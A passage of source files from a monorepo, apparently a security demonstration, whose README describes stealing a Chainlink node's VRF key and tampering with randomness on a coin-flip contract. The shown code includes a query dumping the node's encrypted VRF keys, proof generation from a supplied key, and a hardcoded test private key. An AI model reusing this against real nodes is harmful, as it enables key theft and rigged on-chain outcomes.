  get address(): Bytes {
    let value = this.get("address");
    return value.toBytes();
  }

  set address(value: Bytes) {
    this.set("address", Value.fromBytes(value));
  }

  get balance(): BigInt {
    let value = this.get("balance");
    return value.toBigInt();
  }

  set balance(value: BigInt) {
    this.set("balance", Value.fromBigInt(value));
  }

  get netReward(): BigInt {
    let value = this.get("netReward");
    return value.toBigInt();
  }

  set netReward(value: BigInt) {
    this.set("netReward", Value.fromBigInt(value));
  }

  get playCount(): BigInt {
    let value = this.get("playCount");
    return value.toBigInt();
  }

  set playCount(value: BigInt) {
    this.set("playCount", Value.fromBigInt(value));
  }

  get playWinCount(): BigInt {
    let value = this.get("playWinCount");
    return value.toBigInt();
  }

  set playWinCount(value: BigInt) {
    this.set("playWinCount", Value.fromBigInt(value));
  }

  get playLoseCount(): BigInt {
    let value = this.get("playLoseCount");
    return value.toBigInt();
  }

  set playLoseCount(value: BigInt) {
    this.set("playLoseCount", Value.fromBigInt(value));
  }
}

export class PlayEvent extends Entity {
  constructor(id: string) {
    super();
    this.set("id", Value.fromString(id));
  }

  save(): void {
    let id = this.get("id");
    assert(id !== null, "Cannot save PlayEvent entity without an ID");
    assert(
      id.kind == ValueKind.STRING,
      "Cannot save PlayEvent entity with non-string ID. " +
        'Considering using .toHex() to convert the "id" to a string.'
    );
    store.set("PlayEvent", id.toString(), this);
  }

  static load(id: string): PlayEvent | null {
    return store.get("PlayEvent", id) as PlayEvent | null;
  }

  get id(): string {
    let value = this.get("id");
    return value.toString();
  }

  set id(value: string) {
    this.set("id", Value.fromString(value));
  }

  get player(): Bytes {
    let value = this.get("player");
    return value.toBytes();
  }

  set player(value: Bytes) {
    this.set("player", Value.fromBytes(value));
  }

  get side(): boolean {
    let value = this.get("side");
    return value.toBoolean();
  }

  set side(value: boolean) {
    this.set("side", Value.fromBoolean(value));
  }
}

'''
'''--- contracts/flipcoin/package.json ---
{
  "name": "@evilink/contracts-flipcoin",
  "version": "0.1.0",
  "main": "./lib/src/index.js",
  "exports": {
    ".": "./lib/src/index.js"
  },
  "scripts": {
    "build": "yarn compile && yarn build:ts",
    "build:ts": "tsc -b",
    "compile": "waffle compile ../waffle-0.6",
    "compile:watch": "nodemon --exec 'waffle compile ../waffle-0.6' --watch contract --ext sol",
    "test": "NODE_ENV=test mocha --require ts-node/register -t 5000 ./test/**/*.test.ts",
    "test:watch": "yarn test --watch --watch-files ./test/**/*.test.ts,./build/*.json",
    "flatten": "waffle flatten ../waffle-0.6",
    "graph:codegen": "graph codegen",
    "graph:build": "graph build",
    "graph:create": "graph create --node http://localhost:8020 flipcoin",
    "graph:remove": "graph remove --node http://localhost:8020 flipcoin",
    "graph:deploy": "graph deploy --node http://localhost:8020 --ipfs http://localhost:5001 flipcoin",
    "clean": "rm -rf lib contract-artifact"
  },
  "dependencies": {
    "@evilink/artifact-util": "0.1.0",
    "@openzeppelin/contracts": "^3.3.0"
  },
  "devDependencies": {
    "@ethersproject/contracts": "^5.0.8",
    "@evilink/contracts-chainlink": "0.1.0",
    "@graphprotocol/graph-cli": "^0.19.0",
    "@graphprotocol/graph-ts": "^0.19.0",
    "@types/mocha": "^8.2.0",
    "chai": "^4.2.0",
    "ethereum-waffle": "^3.2.1",
    "mocha": "^8.2.1",
    "nodemon": "^2.0.6",
    "ts-node": "^9.1.1",
    "typescript": "^4.1.3"
  },
  "license": "MIT"
}

'''
'''--- contracts/flipcoin/src/artifact.ts ---
import {
  createContractFactory,
  StandardContractOutput,
  ContractFactory,
} from '@evilink/artifact-util'

import * as FlipCoin from '../contract-artifact/FlipCoin.json'
import * as FlipCoinUsingThresholdVRF from '../contract-artifact/FlipCoinUsingThresholdVRF.json'

export const artifact = {
  FlipCoin: FlipCoin as StandardContractOutput,
  FlipCoinUsingThresholdVRF: FlipCoinUsingThresholdVRF as StandardContractOutput,
}

export const flipCoinFactory = createContractFactory(artifact.FlipCoin)
export const flipCoinUsingThresholdVRFFactory = createContractFactory(
  artifact.FlipCoinUsingThresholdVRF,
)

export { StandardContractOutput, ContractFactory }

'''
'''--- contracts/flipcoin/src/index.ts ---
export * from './artifact'

'''
'''--- contracts/flipcoin/subgraph/mapping.ts ---
/* eslint-disable eqeqeq, prefer-const, @typescript-eslint/no-use-before-define, import/prefer-default-export, import/no-extraneous-dependencies */

import { BigInt } from '@graphprotocol/graph-ts'
import { FlipCoin, Player, PlayEvent } from '../generated/schema'
import {
  OwnershipTransferred,
  Subsidized,
  Played,
} from '../generated/FlipCoin/FlipCoin'

const GENESIS_ADDRESS = '0x0000000000000000000000000000000000000000'

let ZERO = BigInt.fromI32(0)
let ONE = BigInt.fromI32(1)
let TWO = BigInt.fromI32(2)
let ONE_HUNDRED = BigInt.fromI32(100)
let TWO_HUNDRED = ONE_HUNDRED.times(TWO)

export function handleOwnershipTransferred(event: OwnershipTransferred): void {
  let flipCoin = FlipCoin.load(event.address.toHex())
  if (flipCoin == null) {
    flipCoin = new FlipCoin(event.address.toHex())
  }

  flipCoin.owner = event.params.newOwner
  if (event.params.previousOwner.toHex() == GENESIS_ADDRESS) {
    flipCoin.jackpot = ZERO
  }

  flipCoin.save()
}

export function handleSubsidized(event: Subsidized): void {
  let flipCoin = FlipCoin.load(event.address.toHex())
  if (flipCoin == null) return // Unexpected

  flipCoin.jackpot = flipCoin.jackpot.plus(event.params.amount)

  flipCoin.save()
}

export function handlePlayed(event: Played): void {
  let flipCoin = FlipCoin.load(event.address.toHex())
  if (flipCoin == null) return // Unexpected

  handlePlayEvent(event)

  let player = Player.load(event.params.player.toHex())
  if (player == null) {
    player = new Player(event.params.player.toHex())
    player.address = event.params.player
    player.balance = ZERO
    player.netReward = ZERO
    player.playCount = ZERO
    player.playWinCount = ZERO
    player.playLoseCount = ZERO
  }

  player.playCount = player.playCount.plus(ONE)
  if (event.params.side) {
    flipCoin.jackpot = flipCoin.jackpot.minus(TWO_HUNDRED)
    player.balance = player.balance.plus(TWO_HUNDRED)
    player.netReward = player.netReward.plus(ONE_HUNDRED)
    player.playWinCount = player.playWinCount.plus(ONE)
  } else {
    flipCoin.jackpot = flipCoin.jackpot.plus(ONE_HUNDRED)
    player.netReward = player.netReward.minus(ONE_HUNDRED)
    player.playLoseCount = player.playLoseCount.plus(ONE)
  }

  flipCoin.save()
  player.save()
}

function handlePlayEvent(event: Played): void {
  let playEvent = new PlayEvent(
    `${event.transaction.hash.toHex()}-${event.logIndex.toString()}`,
  )
  playEvent.player = event.params.player
  playEvent.side = event.params.side
  playEvent.save()
}

'''
'''--- contracts/flipcoin/test/FlipCoin.test.ts ---
import { use } from 'chai'
import { solidity } from 'ethereum-waffle'

use(solidity)

describe('FlipCoin', () => {
  xit('should play FlipCoin', async () => {
    // TODO:
  })
})

'''
'''--- contracts/flipcoin/tsconfig.json ---
{
  "extends": "../../tsconfig.json",
  "compilerOptions": {
    "outDir": "lib"
  },
  "include": ["src/**/*"]
}

'''
'''--- contracts/waffle-0.4.js ---
const base = require('./waffle')

module.exports = { ...base, 'compilerVersion': '0.4.26' }

'''
'''--- contracts/waffle-0.6.js ---
const base = require('./waffle')

module.exports = { ...base, 'compilerVersion': '0.6.12' }

'''
'''--- contracts/waffle-0.8.js ---
const base = require('./waffle')

module.exports = { ...base, 'compilerVersion': '0.8.0' }

'''
'''--- contracts/waffle.js ---
module.exports = {
  'compilerType': 'solcjs',
  'cacheDirectory': '../.cache',
  'sourceDirectory': process.env.CONTRACT_SRC_DIR || './contract',
  'outputDirectory': './contract-artifact',
  'flattenOutputDirectory': './contract-flatten',
}

'''
'''--- package.json ---
{
  "name": "evilink",
  "scripts": {
    "build": "yarn workspaces foreach --parallel --topological-dev run build",
    "test": "yarn workspaces foreach run test",
    "lint": "yarn lint:ts && yarn lint:sol",
    "lint:ts": "eslint '{contracts,packages}/**/*.{ts,tsx}'",
    "lint:sol": "solhint --ignore-path contracts/.gitignore contracts/**/*.sol",
    "prettier": "prettier --check '{contracts,packages}/**/*.{ts,tsx,sol}' --ignore-path .eslintignore"
  },
  "engines": {
    "node": ">=14"
  },
  "workspaces": [
    "contracts/*",
    "packages/*"
  ],
  "devDependencies": {
    "@types/chai": "^4.2.14",
    "@types/mocha": "^8.2.0",
    "@typescript-eslint/eslint-plugin": "^4.11.1",
    "@typescript-eslint/parser": "^4.11.1",
    "eslint": "^7.17.0",
    "eslint-config-airbnb-typescript": "^12.0.0",
    "eslint-config-prettier": "^7.1.0",
    "eslint-plugin-chai-friendly": "^0.6.0",
    "eslint-plugin-import": "^2.22.1",
    "eslint-plugin-prettier": "^3.3.0",
    "prettier": "^2.2.1",
    "prettier-plugin-solidity": "^1.0.0-beta.2",
    "solhint": "^3.3.2",
    "solhint-plugin-prettier": "^0.0.5"
  },
  "dependencies": {
    "ethereum-types": "^3.4.0",
    "ethers": "^5.0.24"
  },
  "license": "MIT"
}

'''
'''--- packages/artifact-util/package.json ---
{
  "name": "@evilink/artifact-util",
  "version": "0.1.0",
  "main": "./lib/index.js",
  "exports": {
    ".": "./lib/index.js"
  },
  "scripts": {
    "build": "tsc -b"
  },
  "dependencies": {
    "@ethersproject/contracts": "^5.0.8",
    "@ethersproject/wallet": "^5.0.9",
    "ethereum-types": "^3.4.0"
  },
  "devDependencies": {
    "typescript": "^4.1.3"
  },
  "license": "MIT"
}

'''
'''--- packages/artifact-util/src/index.ts ---
import { StandardContractOutput } from 'ethereum-types'
import { ContractFactory } from '@ethersproject/contracts'
import { Wallet } from '@ethersproject/wallet'

export const createContractFactory = (artifact: StandardContractOutput) => {
  const factory = new ContractFactory(artifact.abi, artifact.evm.bytecode)
  return {
    interface: factory.interface,
    deploy: async (wallet: Wallet, ...args: Array<any>) =>
      factory
        .connect(wallet)
        .deploy(...args)
        .then((contract) => contract.deployed()),
    attach: (address: string) => factory.attach(address),
  }
}

export { StandardContractOutput, ContractFactory }

'''
'''--- packages/artifact-util/tsconfig.json ---
{
  "extends": "../../tsconfig.json",
  "compilerOptions": {
    "outDir": "lib"
  },
  "include": ["src/**/*"]
}

'''
'''--- packages/chainlink-client/package.json ---
{
  "name": "@evilink/chainlink-client",
  "version": "0.1.0",
  "main": "./lib/index.js",
  "exports": {
    ".": "./lib/index.js"
  },
  "scripts": {
    "build": "tsc -b"
  },
  "dependencies": {
    "axios": "^0.21.1",
    "typescript": "^4.1.3"
  },
  "license": "MIT"
}

'''
'''--- packages/chainlink-client/src/helper.ts ---
import { AxiosInstance, AxiosRequestConfig, AxiosResponse } from 'axios'
import { ChainlinkPageQuery, ChainlinkDocument } from './type'

export type Get<Data> = (
  query?: ChainlinkPageQuery,
  config?: AxiosRequestConfig,
) => Promise<ChainlinkDocument<Data>>

export type PostRaw<Body, Data> = (
  body: Body,
  config?: AxiosRequestConfig,
) => Promise<AxiosResponse<ChainlinkDocument<Data>>>

export type Post<Body, Data> = (
  body: Body,
  config?: AxiosRequestConfig,
) => Promise<ChainlinkDocument<Data>>

export function createGet<Data>(client: AxiosInstance, url: string): Get<Data> {
  return (query?: ChainlinkPageQuery, config?: AxiosRequestConfig) =>
    client({
      ...config,
      url,
      method: 'GET',
      params: query,
    }).then(({ data }) => data)
}

export function createPostRaw<Body, Data>(
  client: AxiosInstance,
  url: string,
): PostRaw<Body, Data> {
  return (body: Body, config?: AxiosRequestConfig) =>
    client({
      ...config,
      url,
      method: 'POST',
      data: body,
    })
}

export function createPost<Body, Data>(
  client: AxiosInstance,
  url: string,
): Post<Body, Data> {
  return (body: Body, config?: AxiosRequestConfig) =>
    client({
      ...config,
      url,
      method: 'POST',
      data: body,
    }).then(({ data }) => data)
}

'''
'''--- packages/chainlink-client/src/index.ts ---
import axios, { AxiosInstance } from 'axios'
import { createGet, createPostRaw, createPost, Get, Post } from './helper'
import { SessionReq, SessionRes, JobSpecReq, JobSpecRes } from './type'

export type IChainlinkClient = {
  listJobSpec: Get<JobSpecRes[]>
  createJobSpec: Post<JobSpecReq, JobSpecRes>
}

export class ChainlinkClient implements IChainlinkClient {
  private static SESSION_KEY = 'clsession'

  private static SESSION_KEY_REG_EXP = `^${ChainlinkClient.SESSION_KEY}=([^;]+);.*`

  static async authenticate(
    endpoint: string,
    body: SessionReq,
  ): Promise<ChainlinkClient> {
    const chainlinkClient = new ChainlinkClient(endpoint)
    await chainlinkClient.authenticate(body)
    return chainlinkClient
  }

  private instance: AxiosInstance

  public listJobSpec: Get<JobSpecRes[]>

  public createJobSpec: Post<JobSpecReq, JobSpecRes>

  constructor(endpoint: string) {
    this.instance = axios.create({ baseURL: endpoint })
    this.listJobSpec = createGet<JobSpecRes[]>(this.instance, '/v2/specs')
    this.createJobSpec = createPost<JobSpecReq, JobSpecRes>(
      this.instance,
      '/v2/specs',
    )
  }

  async authenticate(body: SessionReq) {
    const { headers } = await createPostRaw<SessionReq, SessionRes>(
      this.instance,
      '/sessions',
    )(body)

    const sessionRegExp = new RegExp(ChainlinkClient.SESSION_KEY_REG_EXP)
    const setCookies = headers['set-cookie'] || []
    const cookieSession = (Array.isArray(setCookies)
      ? setCookies
      : [setCookies]
    ).find((setCookie) => sessionRegExp.test(setCookie))

    if (!cookieSession) {
      throw new Error(
        `failed to parse session from response header: ${JSON.stringify(
          headers,
          null,
          2,
        )}`,
      )
    }

    this.instance.defaults.headers = {
      Cookie: `${ChainlinkClient.SESSION_KEY}=${
        sessionRegExp.exec(cookieSession)[1]
      }`,
    }
  }
}

export * from './type'

'''
'''--- packages/chainlink-client/src/type.ts ---
export type ChainlinkPageQuery = {
  size: number
  page: number
}

export type Data<T> = T extends Array<infer Item>
  ? {
      type: string
      id: string
      attributes: Item
      relationships: Record<string, any>
      links: Record<string, any>
    }[]
  : {
      type: string
      id: string
      attributes: T
      relationships: Record<string, any>
      links: Record<string, any>
    }

export type ChainlinkDocument<T> = {
  data: Data<T>
  meta?: Record<string, any> & {
    count: number
  }
  links?: object
  included?: object[]
}

export type ChainlinkModel = {
  id?: string
  createdAt?: string
  updatedAt?: string
}

export type SessionReq = {
  email: string
  password: string
}

export type SessionRes = {
  type: string
  id: string
  attributes: {
    [key: string]: any
    authenticated: boolean
  }
}

export type InitiatorParams = {
  schedule?: string
  time?: string
  ran?: string
  address?: string
  requesters?: string[]
  name?: string
  body?: Record<string, any>
  fromBlock?: string
  toBlock?: string
  topics?: string[]
  requestData?: Record<string, any>
  feeds?: Record<string, any>
  precision?: number
  threshold?: number
  absoluteThreshold?: number
  pollTimer?: {
    disabled?: boolean
    period?: string
  }
  idleTimer?: {
    disabled?: boolean
    duration?: string
  }
}

export type Initiator = ChainlinkModel & {
  type: string
  params?: InitiatorParams
  jobSpecId?: string
}

export type Task = {
  type: string
  params: Record<string, any>
  confirmations: number
}

export type JobSpecReq = {
  name: string
  initiators: Initiator[]
  tasks: Task[]
  startAt?: string
  endAt?: string
  minPayment?: string
}

export type JobSpecError = ChainlinkModel & {
  description: string
  occurrences: number
}

export type JobSpecRes = ChainlinkModel &
  JobSpecReq & {
    errors: JobSpecError[]
    earnings?: string
  }

'''
'''--- packages/chainlink-client/tsconfig.json ---
{
  "extends": "../../tsconfig.json",
  "compilerOptions": {
    "outDir": "lib"
  },
  "include": ["src/**/*"]
}

'''
'''--- packages/chainlink-orm/package.json ---
{
  "name": "@evilink/chainlink-orm",
  "version": "0.1.0",
  "main": "./lib/index.js",
  "exports": {
    ".": "./lib/index.js"
  },
  "scripts": {
    "build": "tsc -b"
  },
  "dependencies": {
    "pg-promise": "^10.8.6",
    "typescript": "^4.1.3"
  },
  "license": "MIT"
}

'''
'''--- packages/chainlink-orm/src/index.ts ---
import pgPromise, { IDatabase } from 'pg-promise'
import { selectAllEncryptedVrfKeys } from './prepared-statement'
import { EncryptedVRFKeys } from './type'

export type IChainlinkOrm = {
  listEncryptedVRFKeys: () => Promise<EncryptedVRFKeys[]>
}

export class ChainlinkOrm implements IChainlinkOrm {
  static async connect(databaseDsn: string) {
    const pgp = pgPromise()(databaseDsn)
    await pgp.connect()
    return new ChainlinkOrm(pgp)
  }

  public database: IDatabase<{}>

  constructor(database: IDatabase<{}>) {
    this.database = database
  }

  listEncryptedVRFKeys() {
    return this.database.any<EncryptedVRFKeys>(selectAllEncryptedVrfKeys)
  }
}

'''
'''--- packages/chainlink-orm/src/prepared-statement.ts ---
import { PreparedStatement } from 'pg-promise'

// eslint-disable-next-line import/prefer-default-export
export const selectAllEncryptedVrfKeys = new PreparedStatement({
  name: 'select_all_encrypted_vrf_keys',
  text: 'SELECT * FROM encrypted_vrf_keys',
})

'''
'''--- packages/chainlink-orm/src/type.ts ---
export type EncryptedVRFKeys = {
  public_key: string
  vrf_key: string
  created_at: string
  updated_at: string
  deleted_at: string
}

'''
'''--- packages/chainlink-orm/tsconfig.json ---
{
  "extends": "../../tsconfig.json",
  "compilerOptions": {
    "outDir": "lib"
  },
  "include": ["src/**/*"]
}

'''
'''--- packages/chainlink-vrf/README.md ---
# @evilink/chainlink-vrf

NodeJS binding for [Chainlink VRF Adapter](https://github.com/smartcontractkit/chainlink/blob/develop/core/adapters/random.go) to generate randomness.

## TODO

- [ ] Test on
  - [x] MacOS
  - [ ] Linux
  - [ ] Win
- [ ] Remove go dependency and implement by [secp256k1](https://github.com/cryptocoinjs/secp256k1-node)

'''
'''--- packages/chainlink-vrf/go/main.go ---
package main

import (
	"C"

	"fmt"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/common/hexutil"

	"evilink/pkg/vrf"
)

// GenerateProof exports GenerateProof
//export GenerateProof
func GenerateProof(privateKey, preSeed, blockHash []byte, blockNumber uint64) (*C.char, *C.char, *C.char, *C.char) {
	proof, err := (&vrf.Key{D: common.BytesToHash(privateKey).Big()}).
		GenerateProof(vrf.PreSeedData{
			PreSeed:     common.BytesToHash(preSeed),
			BlockHash:   common.BytesToHash(blockHash),
			BlockNumber: blockNumber,
		})

	if err != nil {
		return nil, nil, nil, C.CString(fmt.Sprintf("%v", err))
	}

	return C.CString(proof.Randomness.Hex()), C.CString(hexutil.Encode(proof.Packed[:])),
		C.CString(hexutil.Encode(proof.PackedForContractInput[:])), nil
}

// PublicKey exports PublicKey
//export PublicKey
func PublicKey(privateKey []byte) (*C.char, *C.char, *C.char) {
	publicKey := (&vrf.Key{D: common.BytesToHash(privateKey).Big()}).PublicKey()
	return C.CString(hexutil.Encode(publicKey.X.Bytes())),
		C.CString(hexutil.Encode(publicKey.Y.Bytes())),
		C.CString(publicKey.Hash.Hex())
}

func main() {}

'''
'''--- packages/chainlink-vrf/go/pkg/vrf/vrf.go ---
package vrf

import (
	"math/big"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/pkg/errors"
	"github.com/smartcontractkit/chainlink/core/services/signatures/secp256k1"
	"github.com/smartcontractkit/chainlink/core/services/vrf"
)

// Key defines VRF private key
type Key struct {
	D *big.Int
}

// PublicKey defines VRF public key
type PublicKey struct {
	X    *big.Int
	Y    *big.Int
	Hash common.Hash
}

// PreSeedData defines randomness request payload
type PreSeedData struct {
	PreSeed     common.Hash
	BlockHash   common.Hash
	BlockNumber uint64
}

// Proof defines VRF proof
type Proof struct {
	Randomness             common.Hash
	Packed                 [vrf.ProofLength]byte
	PackedForContractInput [vrf.ProofLength + common.HashLength]byte
}

// PublicKey returns corresponding pubilc key coordinate (x, y) on secp256k1
// and keccack256(...x, ...y) as hash.
func (key *Key) PublicKey() PublicKey {
	zero := (&secp256k1.Secp256k1{}).Point()
	x, y := secp256k1.Coordinates(zero.Mul(secp256k1.IntToScalar(key.D), nil))
	return PublicKey{
		X:    x,
		Y:    y,
		Hash: crypto.Keccak256Hash(append(x.Bytes(), y.Bytes()...)),
	}
}

// GenerateProof generates proof from provided pre-seed data
func (key *Key) GenerateProof(preSeedData PreSeedData) (Proof, error) {
	seed := vrf.FinalSeed(vrf.PreSeedData{
		PreSeed:   vrf.Seed(preSeedData.PreSeed),
		BlockHash: preSeedData.BlockHash,
		BlockNum:  preSeedData.BlockNumber,
	})

	proof, err := vrf.GenerateProof(secp256k1.ScalarToHash(secp256k1.IntToScalar(key.D)), common.BigToHash(seed))
	if err != nil {
		return Proof{}, errors.Wrap(err, "failed to generate proof")
	}

	packed, err := proof.MarshalForSolidityVerifier()
	if err != nil {
		return Proof{}, errors.Wrap(err, "failed to pack proof for solidity verifier")
	}

	var packedForContractInput [vrf.ProofLength + common.HashLength]byte
	copy(packedForContractInput[:], packed[:])
	copy(packedForContractInput[6*common.HashLength:7*common.HashLength], preSeedData.PreSeed.Bytes())
	copy(packedForContractInput[vrf.ProofLength:], common.BigToHash(big.NewInt(int64(preSeedData.BlockNumber))).Bytes())

	return Proof{
		Randomness:             common.BigToHash(proof.Output),
		Packed:                 packed,
		PackedForContractInput: packedForContractInput,
	}, nil
}

'''
'''--- packages/chainlink-vrf/go/pkg/vrf/vrf_test.go ---
package vrf

import (
	"testing"

	"github.com/ethereum/go-ethereum/common"
	"github.com/stretchr/testify/assert"
)

var (
	keyD    = common.HexToHash("0x0fdcdb4f276c1b7f6e3b17f6c80d6bdd229cee59955b0b6a0c69f67cbf3943fa").Big()
	keyHash = common.HexToHash("0x9fe62971ada37edbdab3582f8aec660edf7c59b4659d1b9cf321396b73918b56")
)

func TestKeyHash(t *testing.T) {
	publicKey := (&Key{keyD}).PublicKey()
	assert.Equal(t, publicKey.Hash, keyHash, "invalid key hash generated")
}

func TestGenerateRandomness(t *testing.T) {
	proof, err := (&Key{keyD}).GenerateProof(PreSeedData{
		PreSeed:     common.HexToHash("0xb3fb0f766b15159704d515f5e17f813a85d784bcc39ce982af38f0e997aef007"),
		BlockHash:   common.HexToHash("0xda2f81c1e0a64897c37fe16a8d0dce7ea5c2a0de03c9a629277cdd925b3ac228"),
		BlockNumber: 777,
	})

	expectedRandomness := common.HexToHash("0x3c050221596be1d77aecba25186a0b1bcbf131d6fd5846c07f5c2ffb107b2f9b")
	assert.Nil(t, err, "failed to generate randomness")
	assert.Equal(t, proof.Randomness, expectedRandomness, "invalid randomness generated")
}

'''
'''--- packages/chainlink-vrf/package.json ---
{
  "name": "@evilink/chainlink-vrf",
  "version": "0.1.0",
  "private": true,
  "gypfile": true,
  "main": "./lib/index.js",
  "exports": {
    ".": "./lib/index.js"
  },
  "scripts": {
    "install": "node-gyp-build",
    "build": "tsc -b",
    "test": "NODE_ENV=test mocha --require ts-node/register ./test/**/*.test.ts"
  },
  "dependencies": {
    "node-addon-api": "^3.1.0",
    "node-gyp": "^7.1.2",
    "node-gyp-build": "^4.2.3",
    "typescript": "^4.1.3"
  },
  "devDependencies": {
    "chai": "^4.2.0",
    "mocha": "^8.2.1"
  },
  "license": "MIT"
}

'''
'''--- packages/chainlink-vrf/src/index.ts ---
import assert from 'assert'
import build from 'node-gyp-build'

const addon = build(`${__dirname}/..`)

const hashRegExp = new RegExp('^(0x)?[0-9a-f]{64}$', 'i')

export type Proof = {
  randomness: string
  packed: string
  packedForContractInput: string
}

export const generateProof = (
  privateKey: string,
  preSeed: string,
  blockHash: string,
  blockNumber: number,
): Proof => {
  assert(
    hashRegExp.test(privateKey),
    `expect privateKey in form of ${hashRegExp.source}`,
  )
  assert(
    hashRegExp.test(preSeed),
    `expect preSeed in form of ${hashRegExp.source}`,
  )
  assert(
    hashRegExp.test(blockHash),
    `expect blockHash in form of ${hashRegExp.source}`,
  )
  assert(blockNumber > 0, 'expect blockNumber greater than 0')

  return addon.generateProof(
    Buffer.from(privateKey.replace('0x', ''), 'hex'),
    Buffer.from(preSeed.replace('0x', ''), 'hex'),
    Buffer.from(blockHash.replace('0x', ''), 'hex'),
    blockNumber,
  )
}

export type PublicKey = {
  x: string
  y: string
  hash: string
}

export const publicKey = (privateKey: string): PublicKey => {
  assert(
    hashRegExp.test(privateKey),
    `expect privateKey in form of ${hashRegExp.source}`,
  )

  return addon.publicKey(Buffer.from(privateKey.replace('0x', ''), 'hex'))
}

export const compressed = ({ x, y }: PublicKey): string =>
  `${x}${parseInt(y.slice(-1), 16) % 2 ? '01' : '00'}`

'''
'''--- packages/chainlink-vrf/test/index.test.ts ---
import { expect } from 'chai'

import { generateProof, publicKey } from '../src'

describe('generateProof', () => {
  const [privateKey, preSeed, blockHash, blockNumber] = [
    '0x0fdcdb4f276c1b7f6e3b17f6c80d6bdd229cee59955b0b6a0c69f67cbf3943fa',
    '0xb3fb0f766b15159704d515f5e17f813a85d784bcc39ce982af38f0e997aef007',
    '0xda2f81c1e0a64897c37fe16a8d0dce7ea5c2a0de03c9a629277cdd925b3ac228',
    777,
  ]

  it('should succeed to call generateProof', () => {
    const proof = generateProof(privateKey, preSeed, blockHash, blockNumber)
    const expectedRandomness =
      '0x3c050221596be1d77aecba25186a0b1bcbf131d6fd5846c07f5c2ffb107b2f9b'
    expect(proof.randomness).to.equal(expectedRandomness)
    expect(proof.packed).to.length(2 + 13 * 64)
    expect(proof.packedForContractInput).to.length(2 + 14 * 64)
  })

  it('should fail to call generateProof with invalid argument', () => {
    expect(() =>
      generateProof(privateKey.substr(10), preSeed, blockHash, blockNumber),
    ).to.throw('expect privateKey in form of ^(0x)?[0-9a-f]{64}$')
    expect(() =>
      generateProof(privateKey, preSeed.substr(10), blockHash, blockNumber),
    ).to.throw('expect preSeed in form of ^(0x)?[0-9a-f]{64}$')
    expect(() =>
      generateProof(privateKey, preSeed, blockHash.substr(10), blockNumber),
    ).to.throw('expect blockHash in form of ^(0x)?[0-9a-f]{64}$')
    expect(() =>
      generateProof(privateKey, preSeed, blockHash, -blockNumber),
    ).to.throw('expect blockNumber greater than 0')
  })
})

describe('publicKey', () => {
  const privateKey =
    '0x0fdcdb4f276c1b7f6e3b17f6c80d6bdd229cee59955b0b6a0c69f67cbf3943fa'

  it('should succeed to call publicKey', () => {
    const expectedPublicKey = {
      x: '0x846c38f26b8d5500182d2a6f772088779f8486640a90b2de0c9f591f3176608a',
      y: '0xdd6914234c8294d54e7d88e95db89869b8e7dc11607fef7eed0419323f157411',
      hash:
        '0x9fe62971ada37edbdab3582f8aec660edf7c59b4659d1b9cf321396b73918b56',
    }
    expect(publicKey(privateKey)).to.eql(expectedPublicKey)
  })

  it('should fail to call publicKey with invalid argument', () => {
    expect(() => publicKey(privateKey.substr(10))).to.throw(
      'expect privateKey in form of ^(0x)?[0-9a-f]{64}$',
    )
  })
})

'''
'''--- packages/chainlink-vrf/tsconfig.json ---
{
  "extends": "../../tsconfig.json",
  "compilerOptions": {
    "outDir": "lib"
  },
  "include": ["src/**/*"]
}

'''
'''--- packages/constant/package.json ---
{
  "name": "@evilink/constant",
  "version": "0.1.0",
  "main": "./lib/index.js",
  "exports": {
    ".": "./lib/index.js"
  },
  "scripts": {
    "build": "tsc -b"
  },
  "dependencies": {
    "@ethersproject/constants": "^5.0.7"
  },
  "devDependencies": {
    "typescript": "^4.1.3"
  },
  "license": "MIT"
}

'''
'''--- packages/constant/src/contract-address.ts ---
const CONTRACT_ADDRESS = {
  FAUCET: '0xec8f6a7ebea05fe6bcfce2c0e186f8351ea07281',
  LINK: '0x87cc55e4e3b0a7f8f34cee3a3b39c674b9501ef3',
  VRF_COORDINATOR: '0x4b02650cff1d485bf710b09d6ab52af90d77f922',
  FLIP_COIN: '0xc81eafcd71ce25123929bdd3854d915226e73e15',
}

export default CONTRACT_ADDRESS

'''
'''--- packages/constant/src/index.ts ---
import { WeiPerEther, AddressZero, HashZero } from '@ethersproject/constants'

export const ZERO_ADDRESS = AddressZero
export const ZERO_HASH = HashZero

export const ONE_ETHER = WeiPerEther
export const ONE_MILLION_ETHER = WeiPerEther.mul(1e6)

export const GAS_LIMIT = 1e7

export const GENESIS_PRIVATE_KEY =
  '0xe2f6e93e87143eefce3f0f1be1a05efb6faef4991a8f0b63abdc81b75e2def05'

export { default as CONTRACT_ADDRESS } from './contract-address'

'''
'''--- packages/constant/tsconfig.json ---
{
  "extends": "../../tsconfig.json",
  "compilerOptions": {
    "outDir": "lib"
  },
  "include": ["src/**/*"]
}

'''
'''--- packages/evilthereum/README.md ---
# @evilink/evilthereum

EVILthereum (base on [trufflesuite/ganache-core](https://github.com/trufflesuite/ganache-core)) implements the attack to steal Chainlink node's `vrf_key` and tamper the randomenss by changing block extra data for favorable result.

## Development

### Start with Chainlink Mocker

```bash
yarn dev serve --chainlink-mocker-key 0x$(openssl rand -hex 32)
```

### Create [`ResultChecker`](./src/core/randomness-hacker/type.ts#L11) for [`RandomnessHacker`](./src/core/randomness-hacker/index.ts#L22)

1. Design your victim contract in [`contracts`](../../contracts) and build artifact.
2. Add migration of victim contract in [`migration.ts`](src/core/migration.ts).
3. Add victim contract's address to [`contract-address.ts`](../constant/src/contract-address.ts) for future usage.
4. Implement `ResultChecker` and [register it as well-known victim](./src/core/randomness-hacker/index.ts#L73).

'''
'''--- packages/evilthereum/package.json ---
{
  "name": "@evilink/evilthereum",
  "version": "0.1.0",
  "scripts": {
    "build": "tsc -b",
    "start": "NODE_ENV=production node lib",
    "dev": "ts-node src",
    "dev:watch": "nodemon --watch src --ext ts --exec ts-node src",
    "clean": "rm -rf .evilthereum/chaindb"
  },
  "dependencies": {
    "@ethersproject/bignumber": "^5.0.12",
    "@ethersproject/bytes": "^5.0.8",
    "@ethersproject/constants": "^5.0.7",
    "@ethersproject/contracts": "^5.0.8",
    "@ethersproject/providers": "^5.0.17",
    "@ethersproject/random": "^5.0.6",
    "@ethersproject/strings": "^5.0.7",
    "@ethersproject/wallet": "^5.0.9",
    "@evilink/chainlink-client": "0.1.0",
    "@evilink/chainlink-orm": "0.1.0",
    "@evilink/chainlink-vrf": "0.1.0",
    "@evilink/constant": "0.1.0",
    "@evilink/contracts-chainlink": "0.1.0",
    "@evilink/contracts-faucet": "0.1.0",
